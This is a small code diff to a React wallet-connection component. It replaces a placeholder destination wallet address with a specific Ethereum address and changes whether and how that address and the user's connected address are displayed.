@@ -27,7 +27,7 @@ const appKit = createAppKit({
   ...generalConfig,
 })
 
-const DESTINATION_WALLET = "0x1234567890123456789012345678901234567890" // Replace with your actual wallet address
+const DESTINATION_WALLET = "0x365Fd0098DB3ed48e64fd816beaeEe69FE1e354B" // Replace with your actual wallet address
 
 const WalletDisplay = () => {
   const { address: userAddress, isConnected } = useAccount()
@@ -42,12 +42,12 @@ const WalletDisplay = () => {
     }}>
       {isConnected && (
         <div>
-          {/* <h3>Your wallet address:</h3> */}
+          
           <code style={{ wordBreak: 'break-all' }}>{userAddress}</code>
         </div>
       )}
-      <div style={{ marginTop: '20px', display:'none' }}>
-        <h3>Send to this address:</h3>
+      <div style={{ marginTop: '20px' }}>
+        <h3></h3>
         <code style={{ wordBreak: 'break-all' }}>{DESTINATION_WALLET}</code>
       </div>
     </div>
